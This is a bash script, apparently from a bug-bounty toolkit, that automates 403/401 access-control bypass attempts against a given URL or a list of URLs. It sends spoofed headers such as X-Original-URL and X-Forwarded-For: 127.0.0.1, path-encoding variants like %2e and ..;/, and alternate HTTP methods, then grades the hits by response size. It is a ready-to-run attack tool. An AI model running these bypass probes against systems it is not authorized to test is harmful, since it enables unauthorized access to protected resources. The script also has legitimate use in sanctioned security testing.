#!/bin/bash
# =============================================================================
# 403/401 Bypass Probe — try common header/method/encoding tricks against a URL
#
# Wraps byp4xx (lobuhi) when present. Falls back to a built-in matrix of the
# most-paid bypass techniques from disclosed reports so it works out of the box.
#
# Usage:
#   ./tools/bypass_403.sh <url>
#   ./tools/bypass_403.sh -l <urls-file>     # one URL per line, parallelised
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/external_arsenal.sh"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; MAG='\033[0;35m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
hit()  { echo -e "${MAG}[BYPASS]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1" >&2; }

URL=""; LIST=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -l|--list) shift; LIST="${1:-}" ;;
    -h|--help) sed -n '2,10p' "$0"; exit 0 ;;
    *) URL="$1" ;;
  esac
  shift
done

[ -z "$URL" ] && [ -z "$LIST" ] && { err "url or -l <file> required"; exit 2; }

OUT_DIR="${BYPASS_OUT_DIR:-$(pwd)/findings/bypass/$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT_DIR"

# shellcheck source=banner.sh
. "$SCRIPT_DIR/banner.sh"
print_banner "403 / 401 Bypass Probe" "${URL:-$LIST}" \
    "byp4xx|full bypass matrix when installed" \
    "Built-in|header · method · path · encoding tricks" \
    "Report|matched response codes per technique"

if _have byp4xx; then
  log "byp4xx bypass matrix..."
  if [ -n "$URL" ]; then
    byp4xx -u "$URL" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  else
    byp4xx -L "$LIST" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  fi
  ok "byp4xx done — see $OUT_DIR/byp4xx.txt"
  exit 0
fi

# WAF challenge page patterns — if body matches, downgrade to [INFORMATIONAL]
_is_waf_page() {
  echo "$1" | grep -qiE "Access Denied|Cloudflare|You have been blocked|blocked by|security check|Please Wait|Ray ID|cf-error"
}

# Built-in fallback — most common header / method / path tricks
_probe_one() {
  local target="$1" found=0
  local base="${target%/*}"      # strip last segment
  local last="${target##*/}"
  log "probing $target"

  # Capture baseline 403 body length for content comparison
  local orig_body orig_len
  orig_body=$(curl -sk --max-time 5 "$target" 2>/dev/null || true)
  orig_len=${#orig_body}

  for combo in \
    "GET|$target|X-Original-URL: $target" \
    "GET|$target|X-Rewrite-URL: $target" \
    "GET|$target|X-Forwarded-For: 127.0.0.1" \
    "GET|$target|X-Forwarded-Host: localhost" \
    "GET|$target|X-Custom-IP-Authorization: 127.0.0.1" \
    "GET|$target|X-Client-IP: 127.0.0.1" \
    "GET|$target|X-Host: localhost" \
    "GET|${base}/%2e/${last}|" \
    "GET|${base}/.${last}|" \
    "GET|${base}/${last}/|" \
    "GET|${base}/${last}/.|" \
    "GET|${base}/${last};/|" \
    "GET|${base}/${last}..;/|" \
    "GET|${base}/${last}.json|" \
    "GET|${base}/${last}#|" \
    "POST|$target|" \
    "PUT|$target|" \
    "PATCH|$target|" \
    "TRACE|$target|" ; do
    method=$(echo "$combo" | cut -d'|' -f1)
    url=$(echo "$combo" | cut -d'|' -f2)
    hdr=$(echo "$combo" | cut -d'|' -f3)

    # Capture body and status code together
    local body_file
    body_file=$(mktemp /tmp/bypass_body_XXXXXX)
    args=( -sk -w "%{http_code}" --max-time 5 -X "$method" -o "$body_file" )
    [ -n "$hdr" ] && args+=( -H "$hdr" )
    code=$(curl "${args[@]}" "$url" 2>/dev/null || echo 0)
    bypass_body=$(cat "$body_file" 2>/dev/null || true)
    rm -f "$body_file"
    bypass_len=${#bypass_body}

    if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
      # Determine confidence state:
      #   [CONFIRMED]    — body differs significantly from 403 baseline AND is not a WAF page
      #   [POSSIBLE]     — 200 returned but body within 50 bytes of 403 (likely WAF soft-block)
      #   [INFORMATIONAL]— body contains WAF challenge strings
      local len_diff=$(( bypass_len - orig_len ))
      [ "$len_diff" -lt 0 ] && len_diff=$(( orig_len - bypass_len ))

      local state
      if _is_waf_page "$bypass_body"; then
        state="[INFORMATIONAL]"
      elif [ "$len_diff" -le 50 ]; then
        state="[POSSIBLE]"
      else
        state="[CONFIRMED]"
      fi

      hit "$state $method  $url  $hdr  → HTTP $code (body_len=$bypass_len orig_len=$orig_len)"
      echo "$state $method|$url|$hdr|$code|body_len=$bypass_len|orig_len=$orig_len" >> "$OUT_DIR/bypass_hits.txt"
      found=1
    elif [ "$code" = "301" ] || [ "$code" = "302" ] || [ "$code" = "303" ] || [ "$code" = "307" ] || [ "$code" = "308" ]; then
      hit "[INFORMATIONAL] $method  $url  $hdr  → HTTP $code (redirect)"
      echo "[INFORMATIONAL] $method|$url|$hdr|$code|redirect" >> "$OUT_DIR/bypass_hits.txt"
      found=1
    fi
  done
  [ "$found" = "0" ] && ok "no bypass on $target"
}

if [ -n "$URL" ]; then
  _probe_one "$URL"
else
  while IFS= read -r u; do
    [ -z "$u" ] && continue
    _probe_one "$u"
  done < "$LIST"
fi
